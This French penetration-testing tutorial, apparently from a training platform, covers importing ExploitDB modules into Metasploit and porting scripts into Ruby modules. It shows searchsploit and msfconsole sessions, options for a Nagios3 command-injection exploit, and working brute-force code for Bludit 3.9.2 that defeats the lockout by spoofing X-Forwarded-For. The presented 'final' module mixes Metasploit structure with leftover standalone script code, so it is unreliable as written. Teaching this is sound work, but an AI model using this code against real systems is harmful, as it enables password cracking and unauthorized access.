[[Metasploitable HTB]]

Pour installer de nouveaux modules Metasploit qui ont déjà été portés par d'autres utilisateurs, on peut choisir de mettre à jour sa `msfconsole` depuis le terminal, ce qui garantira que tous les exploits, auxiliaires et fonctionnalités les plus récents seront installés dans la dernière version de `msfconsole`. Tant que les modules portés ont été poussés dans la branche principale `Metasploit-framework` sur GitHub, nous devrions être à jour avec les derniers modules.

Cependant, si nous n'avons besoin que d'un module spécifique et que nous ne voulons pas effectuer une mise à niveau complète, nous pouvons télécharger ce module et l'installer manuellement. Nous nous concentrerons sur la recherche de modules Metasploit prêts à l'emploi sur ExploitDB, que nous pouvons importer directement dans notre version locale de `msfconsole`.

[ExploitDB](https://www.exploit-db.com) est un excellent choix pour rechercher un exploit personnalisé. Nous pouvons utiliser des tags pour rechercher parmi les différents scénarios d'exploitation pour chaque script disponible. L'un de ces tags est [Metasploit Framework (MSF)](https://www.exploit-db.com/?tag=3), qui, s'il est sélectionné, n'affichera que les scripts qui sont également disponibles au format de module Metasploit. Ceux-ci peuvent être directement téléchargés depuis ExploitDB et installés dans notre répertoire local du Metasploit Framework, d'où ils peuvent être recherchés et appelés depuis `msfconsole`.

https://www.exploit-db.com/?tag=3

![Interface d'Exploit Database montrant les filtres de recherche pour Type, Plateforme, Auteur, Port et Tag réglé sur Metasploit Framework. Affiche une liste d'exploits avec des détails comme la date, le type, la plateforme et l'auteur.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/39/exploit-db.png)

Disons que nous voulons utiliser un exploit trouvé pour `Nagios3`, qui tirera parti d'une vulnérabilité d'injection de commande (command injection). Le module que nous recherchons est `Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)`. Nous lançons donc `msfconsole` et essayons de rechercher cet exploit spécifique, mais nous ne le trouvons pas. Cela signifie que notre Metasploit Framework n'est pas à jour ou que le module d'exploit `Nagios3` spécifique que nous recherchons ne se trouve pas dans la version officielle mise à jour du Metasploit Framework.

#### MSF - Recherche d'Exploits

        shellsession
`msf6 > search nagios  Matching Modules ================     #  Name                                                          Disclosure Date  Rank       Check  Description    -  ----                                                          ---------------  ----       -----  -----------    0  exploit/linux/http/nagios_xi_authenticated_rce                2019-07-29       excellent  Yes    Nagios XI Authenticated Remote Command Execution    1  exploit/linux/http/nagios_xi_chained_rce                      2016-03-06       excellent  Yes    Nagios XI Chained Remote Code Execution    2  exploit/linux/http/nagios_xi_chained_rce_2_electric_boogaloo  2018-04-17       manual     Yes    Nagios XI Chained Remote Code Execution    3  exploit/linux/http/nagios_xi_magpie_debug                     2018-11-14       excellent  Yes    Nagios XI Magpie_debug.php Root Remote Code Execution    4  exploit/linux/misc/nagios_nrpe_arguments                      2013-02-21       excellent  Yes    Nagios Remote Plugin Executor Arbitrary Command Execution    5  exploit/unix/webapp/nagios3_history_cgi                       2012-12-09       great      Yes    Nagios3 history.cgi Host Command Execution    6  exploit/unix/webapp/nagios_graph_explorer                     2012-11-30       excellent  Yes    Nagios XI Network Monitor Graph Explorer Component Command Injection    7  post/linux/gather/enum_nagios_xi                              2018-04-17       normal     No     Nagios XI Enumeration`

Nous pouvons cependant trouver le code de l'exploit [dans les entrées d'ExploitDB](https://www.exploit-db.com/exploits/9861). Alternativement, si nous ne voulons pas utiliser notre navigateur web pour rechercher un exploit spécifique dans ExploitDB, nous pouvons utiliser la version en ligne de commande, `searchsploit`.

        shellsession
`ppporrkkky@htb[/htb]$ searchsploit nagios3  --------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------  Exploit Title                                                                                                                               |  Path --------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Nagios3 - 'history.cgi' Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb Nagios3 - 'history.cgi' Remote Command Execution                                                                                             | multiple/remote/24084.py Nagios3 - 'statuswml.cgi' 'Ping' Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb --------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results`

Notez que les extensions de fichiers hébergés se terminant par `.rb` sont des scripts Ruby qui ont très probablement été conçus spécifiquement pour être utilisés dans `msfconsole`. Nous pouvons également filtrer uniquement par les extensions de fichier `.rb` pour éviter les résultats de scripts qui ne peuvent pas s'exécuter dans `msfconsole`. Notez que tous les fichiers `.rb` ne sont pas automatiquement convertis en modules `msfconsole`. Certains exploits sont écrits en Ruby sans contenir de code compatible avec les modules Metasploit. Nous examinerons l'un de ces exemples dans la sous-section suivante.

        shellsession
`ppporrkkky@htb[/htb]$ searchsploit -t Nagios3 --exclude=".py"  --------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------  Exploit Title                                                                                                                               |  Path --------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Nagios3 - 'history.cgi' Host Command Execution (Metasploit)                                                                                  | linux/remote/24159.rb Nagios3 - 'statuswml.cgi' 'Ping' Command Execution (Metasploit)                                                                              | cgi/webapps/16908.rb Nagios3 - 'statuswml.cgi' Command Injection (Metasploit)                                                                                     | unix/webapps/9861.rb --------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results`

Nous devons télécharger le fichier `.rb` et le placer dans le bon répertoire. Le répertoire par défaut où tous les modules, scripts, plugins et fichiers propriétaires de `msfconsole` sont stockés est `/usr/share/metasploit-framework`. Les dossiers critiques sont également liés symboliquement dans nos dossiers personnels et root à l'emplacement caché `~/.msf4/`.

#### MSF - Structure des Répertoires

        shellsession
`ppporrkkky@htb[/htb]$ ls /usr/share/metasploit-framework/  app     db             Gemfile.lock                  modules     msfdb            msfrpcd    msf-ws.ru  ruby             script-recon  vendor config  documentation  lib                           msfconsole  msf-json-rpc.ru  msfupdate  plugins    script-exploit   scripts data    Gemfile        metasploit-framework.gemspec  msfd        msfrpc           msfvenom   Rakefile   script-password  tools`

        shellsession
`ppporrkkky@htb[/htb]$ ls .msf4/  history  local  logos  logs  loot  modules  plugins  store`

Nous le copions dans le répertoire approprié après avoir téléchargé l'[exploit](https://www.exploit-db.com/exploits/9861). Notez que notre emplacement `~/.msf4` dans le dossier personnel peut ne pas avoir toute la structure de dossiers que celui de `/usr/share/metasploit-framework/` pourrait avoir. Nous devrons donc simplement utiliser `mkdir` pour créer les dossiers appropriés afin que la structure soit la même que celle du dossier original, pour que `msfconsole` puisse trouver les nouveaux modules. Après cela, nous procéderons à la copie du script `.rb` directement à l'emplacement principal.

Veuillez noter qu'il existe certaines conventions de nommage qui, si elles ne sont pas correctement respectées, généreront des erreurs lorsque `msfconsole` tentera de reconnaître le nouveau module que nous avons installé. Utilisez toujours le snake-case, des caractères alphanumériques et des underscores au lieu de tirets.

Par exemple :

- `nagios3_command_injection.rb`
- `our_module_here.rb`

#### MSF - Chargement de Modules Additionnels à l'Exécution

        shellsession
`ppporrkkky@htb[/htb]$ cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb ppporrkkky@htb[/htb]$ msfconsole -m /usr/share/metasploit-framework/modules/`

#### MSF - Chargement de Modules Additionnels

        shellsession
`msf6> loadpath /usr/share/metasploit-framework/modules/`

Alternativement, nous pouvons également lancer `msfconsole` et exécuter la commande `reload_all` pour que le module nouvellement installé apparaisse dans la liste. Une fois la commande exécutée et qu'aucune erreur n'est signalée, essayez soit la fonction `search [nom]` à l'intérieur de `msfconsole`, soit directement avec `use [chemin-du-module]` pour accéder directement au module nouvellement installé.

        shellsession
`msf6 > reload_all msf6 > use exploit/unix/webapp/nagios3_command_injection  msf6 exploit(unix/webapp/nagios3_command_injection) > show options  Module options (exploit/unix/webapp/nagios3_command_injection):     Name     Current Setting                 Required  Description    ----     ---------------                 --------  -----------    PASS     guest                           yes       The password to authenticate with    Proxies                                  no        A proxy chain of format type:host:port[,type:host:port][...]    RHOSTS                                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'    RPORT    80                              yes       The target port (TCP)    SSL      false                           no        Negotiate SSL/TLS for outgoing connections    URI      /nagios3/cgi-bin/statuswml.cgi  yes       The full URI path to statuswml.cgi    USER     guest                           yes       The username to authenticate with    VHOST                                    no        HTTP server virtual host   Exploit target:     Id  Name    --  ----    0   Automatic Target`

Nous sommes maintenant prêts à le lancer contre notre cible.

---

## Porter des Scripts en Modules Metasploit

Pour adapter un script d'exploit personnalisé en Python, PHP, ou tout autre type, en un module Ruby pour Metasploit, nous devrons apprendre le langage de programmation Ruby. Notez que les modules Ruby pour Metasploit sont toujours écrits en utilisant des tabulations dures.

Lorsque l'on commence un projet de portage, il n'est pas nécessaire de commencer à coder de zéro. Au lieu de cela, nous pouvons prendre l'un des modules d'exploit existants de la catégorie dans laquelle notre projet s'inscrit et le réutiliser pour notre script de portage actuel. Gardez à l'esprit de toujours garder vos modules personnalisés organisés afin que vous et d'autres testeurs d'intrusion (pentesters) puissiez bénéficier d'un environnement propre et organisé lors de la recherche de modules personnalisés.

Nous commençons par choisir un code d'exploit à porter sur Metasploit. Dans cet exemple, nous allons opter pour [Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass](https://www.exploit-db.com/exploits/48746). Nous devrons télécharger le script `48746.rb` et procéder à sa copie dans le dossier `/usr/share/metasploit-framework/modules/exploits/linux/http/`. Si nous démarrons `msfconsole` maintenant, nous ne pourrons trouver qu'un seul exploit `Bludit CMS` dans le même dossier que ci-dessus, ce qui confirme que notre exploit n'a pas encore été porté. C'est une bonne nouvelle qu'il y ait déjà un exploit Bludit dans ce dossier, car nous l'utiliserons comme code modèle pour notre nouvel exploit.

#### Porter des Modules MSF

        shellsession
`ppporrkkky@htb[/htb]$ ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit  bludit_upload_images_exec.rb`

        shellsession
`ppporrkkky@htb[/htb]$ cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb`

Au début du fichier que nous avons copié, où nous allons remplir nos informations, nous pouvons remarquer les instructions `include` au début du module modèle. Ce sont les mixins mentionnés dans la section `Plugins et Mixins`, et nous devrons les remplacer par ceux qui conviennent à notre module.

Si nous voulons trouver les mixins, classes et méthodes appropriés requis pour que notre module fonctionne, nous devrons consulter les différentes entrées sur la [Documentation Metasploit](https://docs.metasploit.com/api/).

---

## Écrire Notre Propre Module

Lors de certaines évaluations, nous serons souvent confrontés à un réseau sur mesure exécutant du code propriétaire pour servir ses clients. La plupart des modules que nous avons à notre disposition n'ont même pas le moindre effet sur leur périmètre, et nous ne parvenons pas à scanner et documenter correctement la cible avec ce que nous avons. C'est là que nous pourrions trouver utile de dépoussiérer nos compétences en Ruby et de commencer à coder nos propres modules.

Toutes les informations nécessaires sur la programmation en Ruby pour Metasploit se trouvent sur la page correspondante de la [Documentation Metasploit](https://docs.metasploit.com/api/). Des scanners aux autres outils auxiliaires, des exploits sur mesure à ceux qui sont portés, coder en Ruby pour le Framework est une compétence incroyablement applicable.

Veuillez regarder ci-dessous un module similaire que nous pouvons utiliser comme code modèle pour notre portage d'exploit. Il s'agit de l'exploit [Bludit Directory Traversal Image File Upload Vulnerability](https://www.exploit-db.com/exploits/47699), qui a déjà été importé dans `msfconsole`. Prenez un moment pour prendre connaissance de tous les différents champs inclus dans le module avant la preuve de concept (POC) de l'exploit. Notez que ce code n'a pas été modifié dans l'extrait ci-dessous pour s'adapter à notre importation actuelle, mais il s'agit d'un instantané direct du module préexistant mentionné ci-dessus. Les informations devront être ajustées en conséquence pour le nouveau projet de portage.

#### Preuve de Concept - Prérequis

        ruby
`## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::PhpEXE   include Msf::Exploit::FileDropper   include Msf::Auxiliary::Report`

Nous pouvons examiner les instructions `include` pour voir ce que chacune fait. Cela peut être fait en les croisant avec la [documentation de Metasploit](https://docs.metasploit.com/api/). Voici leurs fonctions respectives telles qu'expliquées dans la documentation :

|**Fonction**|**Description**|
|---|---|
|`Msf::Exploit::Remote::HttpClient`|Ce module fournit des méthodes pour agir en tant que client HTTP lors de l'exploitation d'un serveur HTTP.|
|`Msf::Exploit::PhpEXE`|Ceci est une méthode pour générer une charge utile (payload) php de premier étage.|
|`Msf::Exploit::FileDropper`|Cette méthode transfère des fichiers et gère le nettoyage des fichiers après l'établissement d'une session avec la cible.|
|`Msf::Auxiliary::Report`|Ce module fournit des méthodes pour rapporter des données à la base de données MSF.|

En examinant leurs objectifs ci-dessus, nous concluons que nous n'aurons pas besoin de la méthode FileDropper, et nous pouvons la supprimer du code final du module.

Nous voyons qu'il y a différentes sections dédiées à la page `info` du module, la section `options`. Nous les remplissons de manière appropriée, en attribuant le crédit dû aux personnes qui ont découvert l'exploit, les informations CVE, et d'autres détails pertinents.

#### Preuve de Concept - Informations sur le Module

        ruby
  `def initialize(info={})     super(update_info(info,       'Name'           => "Bludit Directory Traversal Image File Upload Vulnerability",       'Description'    => %q{         This module exploits a vulnerability in Bludit. A remote user could abuse the uuid         parameter in the image upload feature in order to save a malicious payload anywhere         onto the server, and then use a custom .htaccess file to bypass the file extension         check to finally get remote code execution.       },       'License'        => MSF_LICENSE,       'Author'         =>         [           'christasa', # Original discovery           'sinn3r'     # Metasploit module         ],       'References'     =>         [           ['CVE', '2019-16113'],           ['URL', 'https://github.com/bludit/bludit/issues/1081'],           ['URL', 'https://github.com/bludit/bludit/commit/a9640ff6b5f2c0fa770ad7758daf24fec6fbf3f5#diff-6f5ea518e6fc98fb4c16830bbf9f5dac' ]         ],       'Platform'       => 'php',       'Arch'           => ARCH_PHP,       'Notes'          =>         {           'SideEffects' => [ IOC_IN_LOGS ],           'Reliability' => [ REPEATABLE_SESSION ],           'Stability'   => [ CRASH_SAFE ]         },       'Targets'        =>         [           [ 'Bludit v3.9.2', {} ]         ],       'Privileged'     => false,       'DisclosureDate' => "2019-09-07",       'DefaultTarget'  => 0))`

Une fois que les informations d'identification générales sont remplies, nous pouvons passer aux variables du menu `options` :

#### Preuve de Concept - Fonctions

        ruby
 `register_options(       [         OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),         OptString.new('BLUDITUSER', [true, 'The username for Bludit']),         OptString.new('BLUDITPASS', [true, 'The password for Bludit'])       ])   end`

En regardant notre exploit, nous voyons qu'une liste de mots (wordlist) sera requise à la place de la variable `BLUDITPASS` pour que le module puisse brute-forcer les mots de passe pour le même nom d'utilisateur. Cela ressemblerait à quelque chose comme l'extrait suivant :

        ruby
`OptPath.new('PASSWORDS', [ true, 'The list of passwords',           File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])`

Le reste du code de l'exploit doit être ajusté en fonction des classes, méthodes et variables utilisées lors du portage vers le Metasploit Framework pour que le module fonctionne à la fin. La version finale du module ressemblerait à ceci :

#### Preuve de Concept

        ruby
`## # This module requires Metasploit: https://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  class MetasploitModule < Msf::Exploit::Remote   Rank = ExcellentRanking    include Msf::Exploit::Remote::HttpClient   include Msf::Exploit::PhpEXE   include Msf::Auxiliary::Report      def initialize(info={})     super(update_info(info,       'Name'           => "Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass",       'Description'    => %q{         Versions prior to and including 3.9.2 of the Bludit CMS are vulnerable to a bypass of the anti-brute force mechanism that is in place to block users that have attempted to login incorrectly ten times or more. Within the bl-kernel/security.class.php file, a function named getUserIp attempts to determine the valid IP address of the end-user by trusting the X-Forwarded-For and Client-IP HTTP headers.       },       'License'        => MSF_LICENSE,       'Author'         =>         [           'rastating', # Original discovery           '0ne-nine9'  # Metasploit module         ],       'References'     =>         [           ['CVE', '2019-17240'],           ['URL', 'https://rastating.github.io/bludit-brute-force-mitigation-bypass/'],           ['PATCH', 'https://github.com/bludit/bludit/pull/1090' ]         ],       'Platform'       => 'php',       'Arch'           => ARCH_PHP,       'Notes'          =>         {           'SideEffects' => [ IOC_IN_LOGS ],           'Reliability' => [ REPEATABLE_SESSION ],           'Stability'   => [ CRASH_SAFE ]         },       'Targets'        =>         [           [ 'Bludit v3.9.2', {} ]         ],       'Privileged'     => false,       'DisclosureDate' => "2019-10-05",       'DefaultTarget'  => 0))             register_options(       [         OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),         OptString.new('BLUDITUSER', [true, 'The username for Bludit']),         OptPath.new('PASSWORDS', [ true, 'The list of passwords',             File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])       ])   end      # -- Exploit code -- #   # dirty workaround to remove this warning: #   Cookie#domain returns dot-less domain name now. Use Cookie#dot_domain if you need "." at the beginning. # see https://github.com/nahi/httpclient/issues/252 class WebAgent   class Cookie < HTTP::Cookie     def domain       self.original_domain     end   end end  def get_csrf(client, login_url)   res = client.get(login_url)   csrf_token = /input.+?name="tokenCSRF".+?value="(.+?)"/.match(res.body).captures[0] end  def auth_ok?(res)   HTTP::Status.redirect?(res.code) &&     %r{/admin/dashboard}.match?(res.headers['Location']) end  def bruteforce_auth(client, host, username, wordlist)   login_url = host + '/admin/login'   File.foreach(wordlist).with_index do |password, i|     password = password.chomp     csrf_token = get_csrf(client, login_url)     headers = {       'X-Forwarded-For' => "#{i}-#{password[..4]}",     }     data = {       'tokenCSRF' => csrf_token,       'username' => username,       'password' => password,     }     puts "[*] Trying password: #{password}"     auth_res = client.post(login_url, data, headers)     if auth_ok?(auth_res)       puts "\n[+] Password found: #{password}"       break     end   end end  #begin #  args = Docopt.docopt(doc) #  pp args if args['--debug'] # #  clnt = HTTPClient.new #  bruteforce_auth(clnt, args['--root-url'], args['--user'], args['--#wordlist']) #rescue Docopt::Exit => e #  puts e.message #end`

Si vous souhaitez en savoir plus sur le portage de scripts dans le Metasploit Framework, consultez le livre [Metasploit: A Penetration Tester's Guide de No Starch Press](https://nostarch.com/metasploit). Rapid7 a également créé des articles de blog sur ce sujet, qui peuvent être trouvés [ici](https://blog.rapid7.com/2012/07/05/part-1-metasploit-module-development-the-series/).